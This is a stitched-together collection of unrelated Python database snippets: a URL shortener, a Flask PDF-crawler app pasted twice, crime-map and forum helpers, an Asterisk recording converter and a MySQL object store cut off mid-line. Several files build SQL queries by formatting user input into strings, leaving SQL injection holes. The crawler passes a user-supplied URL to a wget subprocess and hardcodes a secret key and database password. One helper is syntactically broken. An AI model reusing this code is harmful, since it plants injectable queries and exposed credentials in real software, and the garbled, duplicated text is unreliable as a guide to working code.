	browser_dict = {'firefox': 0 , 'chrome':0 , 'safari':0 , 'other':0}
	platform_dict = {'windows':0 , 'iphone':0 , 'android':0 , 'linux':0 , 'macos':0 , 'other':0}

	# Analytics
	if browser in browser_dict:
		browser_dict[browser] += 1
	else:								
		browser_dict['other'] += 1
	
	if platform in platform_dict.iterkeys():
		platform_dict[platform] += 1
	else:
		platform_dict['other'] += 1
			
	cursor.execute("SELECT URL FROM WEB_URL WHERE S_URL = %s;" ,(short_url,) )

	try:
		new_url = cursor.fetchone()[0]
		print new_url
		# Update Counters 
		
		counter_sql = "\
				UPDATE {tn} SET COUNTER = COUNTER + {og_counter} , CHROME = CHROME + {og_chrome} , FIREFOX = FIREFOX+{og_firefox} ,\
				SAFARI = SAFARI+{og_safari} , OTHER_BROWSER =OTHER_BROWSER+ {og_oth_brow} , ANDROID = ANDROID +{og_andr} , IOS = IOS +{og_ios},\
				WINDOWS = WINDOWS+{og_windows} , LINUX = LINUX+{og_linux}  , MAC =MAC+ {og_mac} , OTHER_PLATFORM =OTHER_PLATFORM+ {og_plat_other} WHERE S_URL = '{surl}';".\                    
				format(tn = "WEB_URL" , og_counter = counter , og_chrome = browser_dict['chrome'] , og_firefox = browser_dict['firefox'],\
				og_safari = browser_dict['safari'] , og_oth_brow = browser_dict['other'] , og_andr = platform_dict['android'] , og_ios = platform_dict['iphone'] ,\
				og_windows = platform_dict['windows'] , og_linux = platform_dict['linux'] , og_mac = platform_dict['macos'] , og_plat_other = platform_dict['other'] ,\                    
				surl = short_url)                    
		res_update = cursor.execute(counter_sql)                    
		conn.commit()
		conn.close()

		return redirect(new_url)

	except Exception as e:
		e = "Something went wrong.Please try again."
		return render_template('404.html') ,404

# Search results
@app.route('/search' ,  methods=['GET' , 'POST'])
def search():
	s_tag = request.form.get('search_url')
	if s_tag == "":
		return render_template('index.html', error = "Please enter a search term")
	else:
		conn = MySQLdb.connect(host , user , passwrd, db)
		cursor = conn.cursor()
		
		search_tag_sql = "SELECT * FROM WEB_URL WHERE TAG = %s" 
		cursor.execute(search_tag_sql , (s_tag, ) )
		search_tag_fetch = cursor.fetchall()
		conn.close()
		return render_template('search.html' , host = shorty_host , search_tag = s_tag , table = search_tag_fetch )


@app.after_request
def after_request(response):
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s %s',timestamp , request.remote_addr , \
				request.method , request.scheme , request.full_path , response.status)
	return response


@app.errorhandler(Exception)
def exceptions(e):
	tb = traceback.format_exc()
	timestamp = strftime('[%Y-%b-%d %H:%M]')
	logger.error('%s %s %s %s %s 5xx INTERNAL SERVER ERROR\n%s',
        timestamp, request.remote_addr, request.method,
        request.scheme, request.full_path, tb)
	return make_response(e , 405)

if __name__ == '__main__':

	# Logging handler
	handler = RotatingFileHandler('shorty.log' , maxBytes=100000 , backupCount = 3)
	logger = logging.getLogger('tdm')
	logger.setLevel(logging.ERROR)
	logger.addHandler(handler)
	app.run(host='127.0.0.1' , port=5000)


import mysql.connector

class BadWordsDB():
    from serverSetup import DBUSER,DBPASS

    def __init__(self,host,user,passwd,database,filterList=[]):
        self.host= host
        self.user = user
        self.passwd = passwd
        self.database = database
        self.filterList = filterList

    def connect(self):
        self.mydb = mysql.connector.connect(
            host=self.host,
            user=self.user,
            passwd=self.passwd,
            database=self.database
        )
        self.cursor = self.mydb.cursor()

    def close(self):
        self.cursor.close()
        self.mydb.close()

    def fetch(self):
        self.connect()

        sqlFormula = "SELECT * FROM badwords"
        self.cursor.execute(sqlFormula)
        myresults = self.cursor.fetchall()

        # Format everything
        badWordArray = []
        for row in myresults:
            badWordArray.append(row[0])

        self.close()

        return badWordArray
    
    def insert(self,targetWord,badwordlist):
        if not targetWord.lower() in badwordlist:
            self.connect()

            sqlFormula = "INSERT INTO badwords (word, badness) VALUE (%s,%s)"
            word = (targetWord.lower(),1)                    

            self.cursor.execute(sqlFormula, word)                    
            self.close()
    
    def printAll(self):
        baddies = self.fetch()
        return ' '.join(baddies)

    def delete(self,targetWord):
        self.connect()

        sqlFormula = "DELETE FROM badwords WHERE word='%s'" % targetWord

        self.cursor.execute(sqlFormula)
        self.close()


import subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj"$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split("timeout %d wget -r -A pdf %s" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split("wget -r -A pdf %s" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return "process already killed"
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for("table_detection"))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = "data/%s" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute("INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)",                    
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))                    

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute("SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)")                    

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result["cid"]
        return redirect(url_for("cid_statistics", cid=cid_last_crawl))
    else:
        flash("There are no statistics to display, please start a new query and wait for it to complete.", "danger")
        return redirect(url_for("index"))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)                    
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = "None"
        most_recent_pdf = "None"

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute("INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username'] # FIXME SQL_injection danger?                    
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute("SELECT * FROM Users WHERE username = %s", [username])                    

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME fucking stupid username is not primary key                    
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute("DELETE FROM Crawls WHERE cid = %s" % cid)                    

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute("SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls")                    

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj"$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')


import subprocess
import shlex
import os
import signal
from helper import path_dict, path_number_of_files, pdf_stats, pdf_date_format_to_datetime
import json
from functools import wraps
from urllib.parse import urlparse

from flask import Flask, render_template, flash, redirect, url_for, session, request, logging
from flask_mysqldb import MySQL
from wtforms import Form, StringField, TextAreaField, PasswordField, validators
from passlib.hash import sha256_crypt
import time

app = Flask(__name__)
app.secret_key = 'Aj"$7PE#>3AC6W]`STXYLz*[G\gQWA'


# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'mountain'
app.config['MYSQL_DB'] = 'bar'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'

# init MySQL
mysql = MySQL(app)

# CONSTANTS
WGET_DATA_PATH = 'data'
PDF_TO_PROCESS = 10
MAX_CRAWLING_DURATION = 60 # 15 minutes
WAIT_AFTER_CRAWLING = 1000


# Helper Function

# Check if user logged in
def is_logged_in(f):
    @wraps(f)
    def wrap(*args, **kwargs):
        if 'logged_in' in session:
            return f(*args, **kwargs)
        else:
            flash('Unauthorized, Please login', 'danger')
            return redirect(url_for('login'))
    return wrap


# Index
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST': #FIXME I didn't handle security yet !! make sure only logged-in people can execute

        # User can type in url
        # The url will then get parsed to extract domain, while the crawler starts at url.

        # Get Form Fields and save
        url = request.form['url']
        parsed = urlparse(url)

        session['domain'] = parsed.netloc
        session['url'] = url

        # TODO use WTForms to get validation

        return redirect(url_for('crawling'))

    return render_template('home.html')


# Crawling
@app.route('/crawling')
@is_logged_in
def crawling():
    # STEP 0: TimeKeeping
    session['crawl_start_time'] = time.time()

    # STEP 1: Prepare WGET command
    url = session.get('url', None)

    command = shlex.split("timeout %d wget -r -A pdf %s" % (MAX_CRAWLING_DURATION, url,)) #FIXME timeout remove
    #command = shlex.split("wget -r -A pdf %s" % (url,))

    #TODO use celery
    #TODO give feedback how wget is doing

    #TODO https://stackoverflow.com/questions/15041620/how-to-continuously-display-python-output-in-a-webpage

    # STEP 2: Execute command in subdirectory
    process = subprocess.Popen(command, cwd=WGET_DATA_PATH)
    session['crawl_process_id'] = process.pid

    return render_template('crawling.html', max_crawling_duration=MAX_CRAWLING_DURATION)


# End Crawling Manual
@app.route('/crawling/end')
@is_logged_in
def end_crawling():

    # STEP 1: Kill crawl process
    p_id = session.get('crawl_process_id', None)
    os.kill(p_id, signal.SIGTERM)

    session['crawl_process_id'] = -1

    # STEP 2: TimeKeeping
    crawl_start_time = session.get('crawl_start_time', None)
    session['crawl_total_time'] = time.time() - crawl_start_time

    # STEP 3: Successful interruption
    flash('You successfully interrupted the crawler', 'success')

    return render_template('end_crawling.html')


# End Crawling Automatic
@app.route('/crawling/autoend')
@is_logged_in
def autoend_crawling():

    # STEP 0: Check if already interrupted
    p_id = session.get('crawl_process_id', None)
    if p_id < 0:
        return "process already killed"
    else:
        # STEP 1: Kill crawl process
        os.kill(p_id, signal.SIGTERM)

        # STEP 2: TimeKeeping
        crawl_start_time = session.get('crawl_start_time', None)
        session['crawl_total_time'] = time.time() - crawl_start_time

        # STEP 3: Successful interruption
        flash('Time Limit reached - Crawler interrupted automatically', 'success')

        return redirect(url_for("table_detection"))


# Start table detection
@app.route('/table_detection')
@is_logged_in
def table_detection():
    return render_template('table_detection.html', wait=WAIT_AFTER_CRAWLING)


# About
@app.route('/about')
def about():
    return render_template('about.html')


# PDF processing
@app.route('/processing')
@is_logged_in
def processing():

    # STEP 0: Time keeping
    proc_start_time = time.time()

    domain = session.get('domain', None)
    if domain == None:
        pass
        # TODO think of bad cases

    path = "data/%s" % (domain,)

    # STEP 1: Call Helper function to create Json string

    # FIXME workaround to weird file system bug with latin/ cp1252 encoding..
    # https://stackoverflow.com/questions/35959580/non-ascii-file-name-issue-with-os-walk works
    # https://stackoverflow.com/questions/2004137/unicodeencodeerror-on-joining-file-name doesn't work
    hierarchy_dict = path_dict(path)  # adding ur does not work as expected either
    hierarchy_json = json.dumps(hierarchy_dict, sort_keys=True, indent=4)  # , encoding='cp1252' not needed in python3

    # FIXME remove all session stores

    # STEP 2: Call helper function to count number of pdf files
    n_files = path_number_of_files(path)
    session['n_files'] = n_files

    # STEP 3: Extract tables from pdf's
    stats, n_error, n_success = pdf_stats(path, PDF_TO_PROCESS)

    # STEP 4: Save stats
    session['n_error'] = n_error
    session['n_success'] = n_success
    stats_json = json.dumps(stats, sort_keys=True, indent=4)
    session['stats'] = stats_json

    # STEP 5: Time Keeping
    proc_over_time = time.time()
    proc_total_time = proc_over_time - proc_start_time

    # STEP 6: Save query in DB
    # Create cursor
    cur = mysql.connection.cursor()

    # Execute query
    cur.execute("INSERT INTO Crawls(cid, crawl_date, pdf_crawled, pdf_processed, process_errors, domain, url, hierarchy, stats, crawl_total_time, proc_total_time) VALUES(NULL, NULL, %s ,%s, %s, %s, %s, %s, %s, %s, %s)",                    
                (n_files, n_success, n_error, domain, session.get('url', None), hierarchy_json, stats_json, session.get('crawl_total_time', None), proc_total_time))                    

    # Commit to DB
    mysql.connection.commit()

    # Close connection
    cur.close()

    return render_template('processing.html', n_files=n_success, domain=domain, cid=0)

# Last Crawl Statistics
@app.route('/statistics')
@is_logged_in
def statistics():
    # Create cursor
    cur = mysql.connection.cursor()

    # Get user by username
    cur.execute("SELECT cid FROM Crawls WHERE crawl_date = (SELECT max(crawl_date) FROM Crawls)")                    

    result = cur.fetchone()

    # Close connection
    cur.close()

    if result:
        cid_last_crawl = result["cid"]
        return redirect(url_for("cid_statistics", cid=cid_last_crawl))
    else:
        flash("There are no statistics to display, please start a new query and wait for it to complete.", "danger")
        return redirect(url_for("index"))


# CID specific Statistics
@app.route('/statistics/<int:cid>')
@is_logged_in
def cid_statistics(cid):

    # STEP 1: retrieve all saved stats from DB
    # Create cursor
    cur = mysql.connection.cursor()

    result = cur.execute('SELECT * FROM Crawls WHERE cid = %s' % cid)                    
    crawl = cur.fetchall()[0]

    # Close connection
    cur.close();

    print(session.get('stats', None))
    print(crawl['stats'])

    # STEP 2: do some processing to retrieve interesting info from stats
    json_stats = json.loads(crawl['stats'])
    json_hierarchy = json.loads(crawl['hierarchy'])

    stats_items = json_stats.items()
    n_tables = sum([subdict['n_tables_pages'] for filename, subdict in stats_items])
    n_rows = sum([subdict['n_table_rows'] for filename, subdict in stats_items])

    medium_tables = sum([subdict['table_sizes']['medium'] for filename, subdict in stats_items])
    small_tables = sum([subdict['table_sizes']['small'] for filename, subdict in stats_items])
    large_tables = sum([subdict['table_sizes']['large'] for filename, subdict in stats_items])

    # Find some stats about creation dates
    creation_dates_pdf = [subdict['creation_date'] for filename, subdict in stats_items]
    creation_dates = list(map(lambda str : pdf_date_format_to_datetime(str), creation_dates_pdf))

    if len(creation_dates) > 0:
        oldest_pdf = min(creation_dates)
        most_recent_pdf = max(creation_dates)
    else:
        oldest_pdf = "None"
        most_recent_pdf = "None"

    return render_template('statistics.html', n_files=crawl['pdf_crawled'], n_success=crawl['pdf_processed'],
                           n_tables=n_tables, n_rows=n_rows, n_errors=crawl['process_errors'], domain=crawl['domain'],
                           small_tables=small_tables, medium_tables=medium_tables,
                           large_tables=large_tables, stats=json_stats, hierarchy=json_hierarchy,
                           end_time=crawl['crawl_date'], crawl_total_time=round(crawl['crawl_total_time'] / 60.0, 1),
                           proc_total_time=round(crawl['proc_total_time'] / 60.0, 1),
                           oldest_pdf=oldest_pdf, most_recent_pdf=most_recent_pdf)


class RegisterForm(Form):
    name = StringField('Name', [validators.Length(min=1, max=50)])
    username = StringField('Username', [validators.Length(min=4, max=25)])
    email = StringField('Email', [validators.Length(min=6, max=50)])
    password = PasswordField('Password', [validators.DataRequired(),
                                          validators.EqualTo('confirm', message='Passwords do not match')])
    confirm = PasswordField('Confirm Password')


# Register
@app.route('/register', methods=['GET', 'POST'])
def register():
    form = RegisterForm(request.form)
    if request.method == 'POST' and form.validate():
        name = form.name.data
        email = form.email.data
        username = form.username.data
        password = sha256_crypt.encrypt(str(form.password.data))

        # Create cursor
        cur = mysql.connection.cursor()

        # Execute query
        cur.execute("INSERT INTO Users(name, email, username, password) VALUES(%s, %s, %s, %s)",
                    (name, email, username, password))

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        flash('You are now registered and can log in', 'success')

        return redirect(url_for('login'))

    return render_template('register.html', form=form)


# User login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        # Get Form Fields
        username = request.form['username'] # FIXME SQL_injection danger?                    
        password_candidate = request.form['password']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute("SELECT * FROM Users WHERE username = %s", [username])                    

        if result > 0:
            # Get stored hash
            data = cur.fetchone() # FIXME fucking stupid username is not primary key                    
            password = data['password']

            # Compare passwords
            if sha256_crypt.verify(password_candidate, password): # FIXME how does sha256 work?

                # Check was successful -> create session variables
                session['logged_in'] = True
                session['username'] = username

                flash('You are now logged in', 'success')
                return redirect(url_for('index'))
            else:
                error = 'Invalid login'
                return render_template('login.html', error=error)

        else:
            error = 'Username not found'
            return render_template('login.html', error=error)

        # Close connection
        cur.close() # FIXME shouldn't that happen before return?

    return render_template('login.html')


# Delete Crawl
@app.route('/delete_crawl', methods=['POST'])
@is_logged_in
def delete_crawl():

        # Get Form Fields
        cid = request.form['cid']

        # Create cursor
        cur = mysql.connection.cursor()

        # Get user by username
        result = cur.execute("DELETE FROM Crawls WHERE cid = %s" % cid)                    

        # Commit to DB
        mysql.connection.commit()

        # Close connection
        cur.close()

        # FIXME check if successfull first, return message
        flash('Crawl successfully removed', 'success')

        return redirect(url_for('dashboard'))


# Logout
@app.route('/logout')
@is_logged_in
def logout():
    session.clear()
    flash('You are now logged out', 'success')
    return redirect(url_for('login'))


# Dashboard
@app.route('/dashboard')
@is_logged_in
def dashboard():

    # Create cursor
    cur = mysql.connection.cursor()

    # Get Crawls
    result = cur.execute("SELECT cid, crawl_date, pdf_crawled, pdf_processed, domain, url FROM Crawls")                    

    crawls = cur.fetchall()

    if result > 0:
        return render_template('dashboard.html', crawls=crawls)
    else:
        msg = 'No Crawls Found'
        return render_template('dashboard.html', msg=msg)

    # Close connection FIXME is this code executed
    cur.close()


if __name__ == '__main__':
    app.secret_key='Aj"$7PE#>3AC6W]`STXYLz*[G\gQWA'
    app.run(debug=True)
    #app.run(host='0.0.0.0')


import pymysql
import dbconfig

class DBHelper:
    def connect(self, database="crimemap"):
        return pymysql.connect(host='localhost',
                               user=dbconfig.db_user,
                               passwd=dbconfig.db_password,
                               db=database)

    def get_all_inputs(self):
        connection=self.connect()
        try:
            query="SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    def add_input(self, data):
        connection=self.connect()
        try:
            query="INSERT INTO crimes (description) VALUES ('{}');".format(data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    def clear_all(self):
        connection=self.connect()
        try:
            query="DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()



import pymysql
import dbconfig

class DBHelper:

	def connect(self, datbase="crimemap"):
		return pymysql.connect(host='localhost',
							user=dbconfig.db_user,
							passwd=dbconfig.db_password,
							db=datbase)

	def get_all_inputs(self):
	connection = self.connect()                    
		try:
			query = "SELECT description FROM crimes;"
			with connection.cursor() as cursor:
				cursor.execute(query)                    
			return cursor.fetchall()
		finally:
			connection.close()

	def add_input(self, data):
		connection = self.connect()                    
		try:
			query = "INSERT INTO crimes (description) VALUES ('{}');".format(data) #i didn't understand this '.format(data)'                    
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

	def clear_all(self):
		connection.connect(self):                    
		try:
			query = "DELETE FROM crimes;"
			with connection.cursor() as cursor:
				cursor.execute(query)                    
				connection.commit()
		finally:
			connection.close()

#!/usr/bin/python3

import MySQLdb
import subprocess
import os.path
import sys

file_format = sys.argv[1]
record_files =  subprocess.check_output(['find', '/var/spool/asterisk/monitor/', '-type', 'f', '-name', '*.wav']).decode()

for wav_file in record_files.splitlines():
	name, ext = os.path.splitext(wav_file)
	prefer_format_file = "{}.".format(name)+file_format
	subprocess.check_output(['ffmpeg', '-i', wav_file, prefer_format_file, '-y'])
	os.remove(wav_file)

try:
    conn = MySQLdb.connect(host="localhost", db="asteriskcdrdb")
    cursor = conn.cursor()

except Exception as e:
    error = True

cursor.execute("SELECT uniqueid,recordingfile FROM cdr")
result = cursor.fetchall()
for unique_id, record_file in result:
    name, ext = os.path.splitext(record_file)
    if ext == ".wav":
        print(ext)
        cursor.execute("UPDATE cdr SET recordingfile='{}.".format(name) + file_format + "'" + " WHERE uniqueid='{}'".format(unique_id))                    
        conn.commit()



# "Database code" for the DB Forum.

import psycopg2
import datetime

def get_posts():
  """Return all posts from the 'database', most recent first."""
  conn = psycopg2.connect("dbname=forum")
  cursor = conn.cursor()
  cursor.execute("select content, time from posts order by time desc")
  all_posts = cursor.fetchall()
  conn.close()
  return all_posts

def add_post(content):
  """Add a post to the 'database' with the current timestamp."""
  conn = psycopg2.connect("dbname=forum")
  cursor = conn.cursor()
  cursor.execute("insert into posts values ('%s')" % content)                    
  conn.commit()
  conn.close()



import new

import MySQLdb
from MySQLdb import Warning

from SQLObjectStore import SQLObjectStore


class MySQLObjectStore(SQLObjectStore):
    """MySQLObjectStore implements an object store backed by a MySQL database.

    MySQL notes:
      * MySQL home page: http://www.mysql.com.
      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27
      * The platforms developed and tested with include Linux (Mandrake 7.1)
        and Windows ME.
      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb
        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.
      * Newer versions of MySQLdb have autocommit switched off by default.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag
      - autocommit

    You wouldn't use the 'db' argument, since that is determined by the model.

    See the MySQLdb docs or the DB API 2.0 docs for more information.
      http://www.python.org/topics/database/DatabaseAPI-2.0.html
    """

    def __init__(self, **kwargs):
        self._autocommit = kwargs.pop('autocommit', False)
        SQLObjectStore.__init__(self, **kwargs)

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('db'):
            args['db'] = self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        conn = self.dbapiModule().connect(**kwargs)
        if self._autocommit:
            # MySQLdb 1.2.0 and later disables autocommit by default
            try:
                conn.autocommit(True)
            except AttributeError:
                pass
        return conn

    def connect(self):
        SQLObjectStore.connect(self)
        if self._autocommit:
            # Since our autocommit patch above does not get applied to pooled
            # connections, we have to monkey-patch the pool connection method
            try:
                pool = self._pool
                connection = pool.connection
            except AttributeError:
                pass
            else:
                def newConnection(self):
                    conn = self._normalConnection()
                    try:
                        conn.autocommit(True)
                    except AttributeError:
                        pass
                    return conn
                pool._normalConnection = connection
                pool._autocommit = self._autocommit
                pool.connection = new.instancemethod(
